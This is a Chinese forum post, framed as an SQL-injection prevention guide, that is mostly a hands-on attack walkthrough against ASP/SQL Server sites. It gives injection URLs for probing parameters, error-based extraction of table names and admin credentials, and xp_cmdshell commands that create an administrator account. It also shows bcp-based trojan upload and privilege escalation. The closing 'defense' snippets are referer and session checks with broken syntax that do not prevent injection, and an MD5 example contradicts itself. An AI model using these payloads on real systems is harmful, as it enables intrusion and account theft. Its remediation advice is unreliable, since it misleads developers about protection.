@@ -1,0 +1,277 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+SQL防注入简介(文章虽老，绝对值得收藏)
+D8888D主贴内容-------------------------------------------------------
+<一>SQL注入简介 
+
+许多网站程序在编写时，没有对用户输入数据的合法性进行判断，使应用程序存在安全隐患。用户可以提交一段数据库查询代码， （一般是在浏览器地址栏进行,通过正常的www端口访问） 根据程序返回的结果，获得某些他想得知的数据，这就是所谓的SQL Injection，即SQL注入。
+
+<二>SQL注入思路 
+
+思路最重要,其实好多人都不知道SQL到底能做什么呢!这里总结一下SQL注入入侵的总体的思路 
+1. SQL注入漏洞的判断，即寻找注入点 
+2. 判断后台数据库类型 
+3. 确定XP_CMDSHELL可执行情况；若当前连接数据的帐号具有SA权限， 
+且master.dbo.xp_cmdshell扩展存储过程(调用此存储过程可以直接使用操作系统的shell)能够正确执行，则整个计算机可以通过几种方法完全控制，也就完成了整个注入过程 
+否则继续： 
+1. 发现WEB虚拟目录 
+2. 上传ASP木马； 
+3. 得到管理员权限
+具体步骤
+一、SQL注入漏洞的判断 
+如果以前没玩过注入，请把IE菜单-工具-Internet选项－高级－显示友好HTTP错误信息前面的勾去掉。 
+为了把问题说明清楚，以下以[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url](这个地址是假想的) 
+为例进行分析，xx可能是整型，也有可能是字符串。 
+1、整型参数的判断 
+当输入的参数xx为整型时，通常news.asp中SQL语句原貌大致如下： 
+select * from 表名 where 字段=xx，所以可以用以下步骤测试SQL注入是否存在。 
+最简单的判断方法 
+[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url]’(附加一个单引号)， 
+此时news.asp中的SQL语句变成了 
+select * from 表名 where 字段=xx’， 
+如果程序没有过滤好“’”的话 
+就会提示 news.asp运行异常； 
+但这样的方法虽然很简单，但并不是最好的 
+因为 
+first,不一定每台服务器的IIS都返回具体错误提示给客户端， 
+如果程序中加了cint(参数)之类语句的话，SQL注入是不会成功的， 
+但服务器同样会报错，具体提示信息为处理 URL 时服务器上出错。 
+请和系统管理员联络。 
+second，目前大多数程序员已经将“’“ 过滤掉，所以用” ’”测试不到注入点 
+所以一般使用经典的1=1和1=2测试方法 
+见下文： 
+[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url] and 1=1, news.asp运行正常， 
+而且与[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url]运行结果相同； 
+[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url] and 1=2, news.asp运行异常；（这就是经典的 1=1 1=2 判断方法） 
+如果以上面满足，news.asp中就会存在SQL注入漏洞，反之则可能不能注入。
+2、字符串型参数的判断 
+方法与数值型参数判断方法基本相同 
+当输入的参数xx为字符串时，通常news.asp中SQL语句原貌大致如下： 
+select * from 表名 where 字段='xx'，所以可以用以下步骤测试SQL注入是否存在。 
+[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url]’(附加一个单引号)，此时news.asp中的SQL语句变成了 
+select * from 表名 where 字段=xx’，news.asp运行异常； 
+[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url] and '1'='1', news.asp运行正常， 
+而且与[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url]运行结果相同； 
+[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url] and '1'='2', news.asp运行异常； 
+如果以上满足，则news.asp存在SQL注入漏洞，反之则不能注入
+3、特殊情况的处理 
+有时ASP程序员会在程序员过滤掉单引号等字符，以防止SQL注入。此时可以用以下几种方法试一试。
+①大小定混合法：由于VBS并不区分大小写，而程序员在过滤时通常要么全部过滤大写字符串，要么全部过滤小写字符串，而大小写混合往往会被忽视。如用SelecT代替select,SELECT等；
+②UNICODE法：在IIS中，以UNICODE字符集实现国际化，我们完全可以IE中输入的字符串化成UNICODE字符串进行输入。如+ =%2B，空格=%20 等；URLEncode信息参见附件一；
+③ASCII码法：可以把输入的部分或全部字符全部
+④出了上述方法以外，还有个更简单的方法就是使用现成的工具像NB联盟的NBSI就是一款很不错的工具，目前最新的版本为2.2 二,判断数据库类型
+不同的数据库的函数、注入方法都是有差异的，所以在注入之前，我们还要判断一下数据库的类型。一般ASP最常搭配的数据库是Access和SQLServer，网上超过99%的网站都是其中之一。
+怎么让程序告诉你它使用的什么数据库呢？来看看： 
+SQLServer有一些系统变量，如果服务器IIS提示没关闭，并且SQLServer返回错误提示的话，那可以直接从出错信息获取。
+方法如下： 
+[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url];and user>0
+这句语句很简单，但却包含了SQLServer特有注入方法的精髓，我自己也是在一次无意的测试中发现这种效率极高的猜解方法。
+让我看来看看它的含义：
+首先，前面的语句是正常的，重点在and user>0，我们知道，user是SQLServer的一个内置变量，它的值是当前连接的用户名，类型为nvarchar。拿一个 nvarchar的值跟int的数0比较，系统会先试图将nvarchar的值转成int型，当然，转的过程中肯定会出错，SQLServer的出错提示是：将nvarchar值 ”abc” 转换数据类型为 int 的列时发生语法错误，呵呵，abc正是变量user的值，这样，不废吹灰之力就拿到了数据库的用户名。
+在以后的篇幅里，大家会看到很多用这种方法的语句。 顺便说几句，众所周知，SQLServer的用户sa是个等同Adminstrators权限的角色，拿到了sa权限，几乎肯定可以拿到主机的 Administrator了。上面的方法可以很方便的测试出是否是用sa登录，要注意的是：如果是sa登录，提示是将”dbo”转换成int的列发生错误，而不是”sa”。
+如果服务器IIS不允许返回错误提示，那怎么判断数据库类型呢？我们可以从Access和SQLServer和区别入手，Access和 SQLServer都有自己的系统表，比如存放数据库中所有对象的表，Access是在系统表[msysobjects]中，但在Web环境下读该表会提示“没有权限”，SQLServer是在表[sysobjects]中，在Web环境下可正常读取。
+在确认可以注入的情况下，使用下面的语句： 
+[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url] ;and (select count(*) from sysobjects)>0 
+[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url] ;and (select count(*) from msysobjects)>0
+如果数据库是SQLServer，那么第一个网址的页面与原页面[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url]是大致相同的；而第二个网址，由于找不到表msysobjects，会提示出错，就算程序有容错处理，页面也与原页面完全不同。
+如果数据库用的是Access，那么情况就有所不同，第一个网址的页面与原页面完全不同；第二个网址，则视乎数据库设置是否允许读该系统表，一般来说是不允许的，所以与原网址也是完全不同。大多数情况下，用第一个网址就可以得知系统所用的数据库类型，第二个网址只作为开启IIS错误提示时的验证。
+三、确定XP_CMDSHELL可执行情况若当前连接数据的帐号具有SA权限，且master.dbo.xp_cmdshell扩展存储过程(调用此存储过程可以直接使用操作系统的shell)能够正确执行，则整个计算机可以通过以下几种方法完全控制，以后的所有步骤都可以省
+1、[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url] and user>;0news.asp执行异常但可以得到当前连接数据库的用户名(若显示dbo则代表SA)。
+2、[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url] and db_name()>0news.asp执行异常但可以得到当前连接的数据库名。
+3、[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url]；exec master..xp_cmdshell “net user aaa bbb /add”–
+(master是SQL-SERVER的主数据库；名中的分号表示SQL-SERVER执行完分号前的语句名，继续执行其后面的语句；“—”号是注解，表示其后面的所有内容仅为注释，系统并不执行)可以直接增加操作系统帐户aaa,密码为bbb。
+4、[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url]；exec master..xp_cmdshell “net localgroup administrators aaa /add”–
+把刚刚增加的帐户aaa加到administrators组中。
+5、[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url]；
+backuup database 数据库名 to disk='c:\inetpub\wwwroot\save.db'则把得到的数据内容全部备份到WEB目录下，再用HTTP把此文件下载(当然首选要知道WEB虚拟目录)。
+6、通过复制CMD创建UNICODE漏洞 
+[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url];exec master.dbo.xp_cmdshell“copy c:\winnt\system32\cmd.exe c:\inetpub\scripts\cmd.exe”
+便制造了一个UNICODE漏洞，通过此漏洞的利用方法，便完成了对整个计算机的控制(当然首选要知道WEB虚拟目录)。 
+这样你就成功的完成了一次SQL注入攻击，先别兴奋，在实践时你就会发现这比理论要难的多会有更多的困难等着你come over ，下面GO ON 
+如果上述条件不成立则需继续奋斗（要挂马了：）） 
+GO ON~! 
+当上述条件不成立时就要继续下面的步骤 
+(一)、发现WEB虚拟目录 
+只有找到WEB虚拟目录，才能确定放置ASP木马的位置，进而得到USER权限。
+有两种方法比较有效。
+一是根据经验猜解，一般来说，WEB虚拟目录是：
+c:\inetpub\wwwroot; D:\inetpub\wwwroot; E:\inetpub\wwwroot等。
+而可执行虚拟目录是： 
+c:\inetpub\scripts; D:\inetpub\scripts; E:\inetpub\scripts等。
+二是遍历系统的目录结构，分析结果并发现WEB虚拟目录； 
+先创建一个临时表：temp 
+[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url];create table temp(id nvarchar(255),num1 nvarchar(255),num2 nvarchar(255),num3 nvarchar(255));–
+接下来： 
+1我们可以利用xp_availablemedia来获得当前所有驱动器,并存入temp表中： 
+[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url];insert temp exec master.dbo.xp_availablemedia;– 
+我们可以通过查询temp的内容来获得驱动器列表及相关信息 
+2我们可以利用xp_subdirs获得子目录列表,并存入temp表中： 
+[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url];insert into temp(id) exec master.dbo.xp_subdirs 'c:\';– 
+3我们还可以利用xp_dirtree获得所有子目录的目录树结构,并寸入temp表中： 
+[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url];insert into temp(id,num1) exec master.dbo.xp_dirtree 'c:\';– 
+这样就可以成功的浏览到所有的目录（文件夹）列表： 
+如果我们需要查看某个文件的内容，可以通过执行xp_cmdsell： 
+[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url];insert into temp(id) exec master.dbo.xp_cmdshell 'type c:\web\index.asp';– 
+使用'bulk insert'语法可以将一个文本文件插入到一个临时表中。如：bulk insert temp(id) from 'c:\inetpub\wwwroot\index.asp'
+浏览temp就可以看到index.asp文件的内容了！通过分析各种ASP文件，可以得到大量系统信息，WEB建设与管理信息，甚至可以得到SA帐号的连接密码。
+当然，如果xp_cmshell能够执行，我们可以用它来完成： 
+[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url];insert into temp(id) exec master.dbo.xp_cmdshell 'dir c:\';– 
+[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url];insert into temp(id) exec master.dbo.xp_cmdshell 'dir c:\ *.asp /s/a';– 
+通过xp_cmdshell我们可以看到所有想看到的，包括W3svc 
+[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url];insert into temp(id) exec master.dbo.xp_cmdshell 'cscript
+C:\Inetpub\AdminScripts\adsutil.vbs enum w3svc' 
+但是，如果不是SA权限，我们还可以使用 
+[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url];insert into temp(id,num1) exec master.dbo.xp_dirtree 'c:\';– 
+注意： 
+1、以上每完成一项浏览后，应删除TEMP中的所有内容，删除方法是： 
+[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url];delete from temp;– 
+2、浏览TEMP表的方法是：(假设TestDB是当前连接的数据库名) 
+[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url] and (select top 1 id from TestDB.dbo.temp )>0得到表TEMP中第一条记录id字段的值，并与 
+整数进行比较，显然news.asp工作异常，但在异常中却可以发现id字段的值。假设发现的表名是xyz，则 
+[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url] and (select top 1 id from TestDB.dbo.temp )>0 where id not in('xyz'))>0得到表TEMP中第二条记录id字段的值。
+(二)、上传ASP木马 
+所谓ASP木马，就是一段有特殊功能的ASP代码，并放入WEB虚拟目录的Scripts下，远程客户通过IE就可执行它，进而得到系统的USER权限，实现对系统的初步控制。上传ASP木马一般有两种比较有效的方法：
+1、利用WEB的远程管理功能 
+许多WEB站点，为了维护的方便，都提供了远程管理的功能；也有不少WEB站点，其内容是对于不同的用户有不同的访问权限。为了达到对用户权限的控制，都有一个网页，要求用户名与密码，只有输入了正确的值，才能进行下一步的操作,可以实现对WEB的管理，如上传、下载文件， 目录浏览、修改配置等。
+因此，若获取正确的用户名与密码，不仅可以上传ASP木马，有时甚至能够直接得到USER权限而浏览系统，上一步的“发现WEB虚拟目录”的复杂操作都可省略。
+用户名及密码一般存放在一张表中，发现这张表并读取其中内容便解决了问题。以下给出两种有效方法。
+A、注入法： 
+从理论上说，认证网页中会有型如： 
+select * from admin where username='XXX' and password='YYY' 的语句，若在正式运行此句之前，没有进行必要的字符过滤，则很容易实施SQL注入。 
+如在用户名文本框内输入：abc’ or 1=1–在密码框内输入：123 则SQL语句变成： 
+select * from admin where username='abc’ or 1=1 and password='123’不管用户输入任何用户名与密码，此语句永远都能正确执行，
+用户轻易骗过系统，获取合法身份。
+B、猜解法： 
+基本思路是：猜解所有数据库名称，猜出库中的每张表名，分析可能是存放用户名与密码的表名，猜出表中的每个字段名，猜出表中的每条记录内容。
+a猜解所有数据库名称 
+[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url] and (select count(*) from master.dbo.sysdatabases where name>1 and dbid=6) <>0因为 dbid 的值从1到5，是系统用了。所以用户自己建的一定是从6开始的。并且我们提交了 name>1 (name字段是一个字符型的字段和数字比较会出错),news.asp工作异常，可得到第一个数据库名，同理把DBID分别改成7,8，9,10,11,12…就可得到所有数据库名。 
+以下假设得到的数据库名是TestDB。
+b猜解数据库中用户名表的名称猜解法：此方法就是根据个人的经验猜表名，一般来说， 
+user,users,member,members,userlist,memberlist,userinfo,manager,admin,adminuser,systemuser,systemusers,sysuser,sysusers,sysacc ounts,systemaccounts等。并通过语句进行判断 
+[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url] and (select count(*) from TestDB.dbo.表名)>0若表名存在，则news.asp工作正常，否则异常。如此循环，直到猜到系统帐号表的名称。 
+读取法：SQL-SERVER有一个存放系统核心信息的表sysobjects，有关一个库的所有表，视图等信息全部存放在此表中，而且此表可以通过WEB进行访问。
+当xtype='U' and status>0代表是用户建立的表，发现并分析每一个用户建立的表及名称，便可以得到用户名表的名称，基本的实现方法是： 
+①[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url] and (select top 1 name from TestDB.dbo.sysobjects where xtype='U' and status>0 )>0 
+得到第一个用户建立表的名称，并与整数进行比较，显然news.asp工作异常，但在异常中却可以发现表的名称。假设发现的表名是xyz，则 
+②[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url] and (select top 1 name from TestDB.dbo.sysobjects where xtype='U' and status>0 and name not in('xyz'))>0可以得到第二个用户建立的表的名称，同理就可得到所有用建立的表的名称。
+根据表的名称，一般可以认定那张表用户存放用户名及密码，以下假设此表名为Admin。
+c 猜解用户名字段及密码字段名称admin表中一定有一个用户名字段，也一定有一个密码字段，只有得到此两个字段的名称，才有可能得到此两字段的内容。如何得到它们的名称呢，同样有以下两种方法。 
+猜解法：此方法就是根据个人的经验猜字段名，一般来说，用户名字段的名称常用：username,name,user,account等。而密码字段的名称常用：password,pass,pwd,passwd等。并通过语句进行判断[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url] and (select count(字段名) from TestDB.dbo.admin)>0“select count(字段名) from 表名”语句得到表的行数，所以若字段名存在，则news.asp工作正常，否则异常。如此循环，直到猜到两个字段的名称。
+读取法：基本的实现方法是 
+[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url] and (select top 1 col_name(object_id('admin'),1) from TestDB.dbo.sysobjects)>0。 
+select top 1 col_name(object_id('admin'),1) from TestDB.dbo.sysobjects是从sysobjects得到已知表名的第一个字段名，当与整数进行比较，显然news.asp工作异常，但在异常中却可以发现字段的名称。把col_name(object_id('admin'),1)中的1依次换成2,3,4,5，6…就可得到所有的字段名称。
+d 猜解用户名与密码 
+猜用户名与密码的内容最常用也是最有效的方法有： 
+ASCII码逐字解码法:虽然这种方法速度较慢，但肯定是可行的。基本的思路是先猜出字段的长度，然后依次猜出每一位的值。猜用户名与猜密码的方法相同，以下以猜用户名为例说明其过程。 
+[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url] and (select top 1 len(username) from TestDB.dbo.admin)=X(X=1,2，3,4，5，… n，username 
+为用户名字段的名称，admin为表的名称)，若x为某一值i且news.asp运行正常时，则i就是第一个用户名的长度。
+如：当输入 
+[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url] and (select top 1 len(username) from TestDB.dbo.admin)=8时news.asp运行正常，则第一个用户名的长度为8 
+[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url] and (select top 1 ascii(substring(username,m,1)) from TestDB.dbo.admin)=n(m的值在1到上一步得到的用户名长度之间，当m=1，2,3，…时猜测分别猜测第1,2,3,…位的值；n的值是1~9、a~z、A~Z的ASCII值，也就是1~128之间的任意值；admin为系统用户帐号表的名称)，若n为某一值i且news.asp运行正常时，则i对应ASCII码就是用户名某一位值。
+如：当输入 
+[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url] and (select top 1 ascii(substring(username,3,1)) from TestDB.dbo.admin)=80时news.asp运行正常，则用户名的第三位为P(P的ASCII为80)； 
+[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url] and (select top 1 ascii(substring(username,9,1)) from TestDB.dbo.admin)=33时news.asp运行正常，则用户名的第9位为!(!的ASCII为80)； 
+猜到第一个用户名及密码后，同理，可以猜出其他所有用户名与密码。注意：有时得到的密码可能是经MD5等方式加密后的信息，还需要用专用工具进行脱密。或者先改其密码，使用完后再改回来，见下面说明。
+简单法：猜用户名用[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url] and (select top 1 flag from TestDB.dbo.admin where username>1) , flag是admin表中的一个字段，username是用户名字段，此时news.asp工作异常，但能得到Username的值。与上同样的方法，可以得到第二用户名，第三个用户等等，直到表中的所有用户名。
+猜用户密码：[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url] and (select top 1 flag from TestDB.dbo.admin where pwd>1) , flag是admin表中的一个字段，pwd是密码字段，此时news.asp工作异常，但能得到pwd的值。与上同样的方法，可以得到第二用户名的密码，第三个用户的密码等等，直到表中的所有用户的密码。密码有时是经MD5加密的，可以改密码。
+[url=http://www.163.com/news.asp?id=xx]链接标记http://www.163.com/news.asp?id=xx[/url];update TestDB.dbo.admin set pwd=' a0b923820dcc509a' where username='www';–( 1的MD5值为：AAABBBCCCDDDEEEF，即把密码改成1；www为已知的用户名) 
+用同样的方法当然可把密码改原来的值。
+2、利用表内容导成文件功能 
+SQL有BCP命令，它可以把表的内容导成文本文件并放到指定位置。利用这项功能，我们可以先建一张临时表，然后在表中一行一行地输入一个 
+ASP木马，然后用BCP命令导出形成ASP文件。 
+命令行格式如下： 
+bcp "select * from text..foo" queryout c:\inetpub\wwwroot\163.asp –c –S localhost –U sa –P foobar ('S'参数为执行查询的服
+务器，'U'参数为用户名，'P'参数为密码，最终上传了一个163.asp的木马)
+3、利用工具，如NBSI
+给出的一些参考数据最重要的表名： 
+select * from sysobjects 
+sysobjectsncsysobjects 
+sysindexestsysindexes 
+syscolumns 
+systypes 
+sysusers 
+sysdatabases 
+sysxlogins 
+sysprocesses 
+最重要的一些用户名（默认sql数据库中存在着的） 
+public 
+dbo 
+guest(一般禁止，或者没权限) 
+db_sercurityadmin 
+ab_dlladmin
+一些默认扩展 
+xp_regaddmultistring 
+xp_regdeletekey 
+xp_regdeletevalue 
+xp_regenumkeys 
+xp_regenumvalues 
+xp_regread 
+xp_regremovemultistring 
+xp_regwrite 
+xp_availablemedia 驱动器相关 
+xp_dirtree目录 
+xp_enumdsn ODBC连接 
+xp_loginconfig 服务器安全模式信息 
+xp_makecab 创建压缩卷 
+xp_ntsec_enumdomainsdomain信息 
+xp_terminate_process 终端进程，给出一个PID
+(三)、得到系统的管理员权限 
+ASP木马只有USER权限，要想获取对系统的完全控制，还要有系统的管理员权限。怎么办？提升权限的方法有很多种： 
+上传木马，修改开机自动运行的.ini文件(它一重启，便死定了)； 
+复制CMD.exe到scripts，人为制造UNICODE漏洞； 
+下载SAM文件，破解并获取OS的所有用户名密码； 
+等等，视系统的具体情况而定，可以采取不同的方法。
+那么我们怎么防注入呢？程序如下加入到asp或html或php或cgi里面都可以。经过测试。加入如 top.asp文件中开头
+方法一： [url=http://www.t00ls.net/#viewSource]链接标记预览源代码[/url] [url=http://www.t00ls.net/#printSource]链接标记打印[/url][url=http://www.t00ls.net/#about]链接标记关于[/url]1<% 
+
+2    if session("username"="" or session("userkey"="" then 
+
+3        response.redirect "../../"
+
+4    end if 
+
+5%>
+(说明：只要有用户注入则跳转到../../目录，呵呵，看你怎么给我注入)
+方法二： [url=http://www.t00ls.net/#viewSource]链接标记预览源代码[/url] [url=http://www.t00ls.net/#printSource]链接标记打印[/url][url=http://www.t00ls.net/#about]链接标记关于[/url]01<% 
+
+02    server_v1=Cstr(Request.ServerVariables("HTTP_REFERER") 
+
+03    server_v2=Cstr(Request.ServerVariables("SERVER_NAME") 
+
+04    ifmid(server_v1,8,len(server_v2))<>server_v2then 
+
+05        response.write"<center><tableborder=1cellpadding=20bordercolor=blackbgcolor=#EEEEEEwidth=450>"
+
+06        response.write"<tr><tdstyle=“font:9ptVerdana“>"
+
+07        response.write"你提交的路径有误，禁止从站点外部提交数据请不要乱该参数！"
+
+08        response.write"</td></tr></table></center>"
+
+09        response.end 
+
+10    endif 
+
+11%>
+(说明：只要有用户注入则判断为外部连接哦，呵呵，看你怎么给我注入)
+方法三： [url=http://www.t00ls.net/#viewSource]链接标记预览源代码[/url] [url=http://www.t00ls.net/#printSource]链接标记打印[/url][url=http://www.t00ls.net/#about]链接标记关于[/url]01<% 
+
+02    dim From_url,Serv_url 
+
+03    From_url = Cstr(Request.ServerVariables("HTTP_REFERER") 
+
+04    Serv_url = Cstr(Request.ServerVariables("SERVER_NAME") 
+
+05    if mid(From_url,8,len(Serv_url)) <> Serv_url then 
+
+06        response.write "NO"
+
+07        response.redirect("../"
+
+08        response.end 
+
+09    end if 
+
+10%>
+
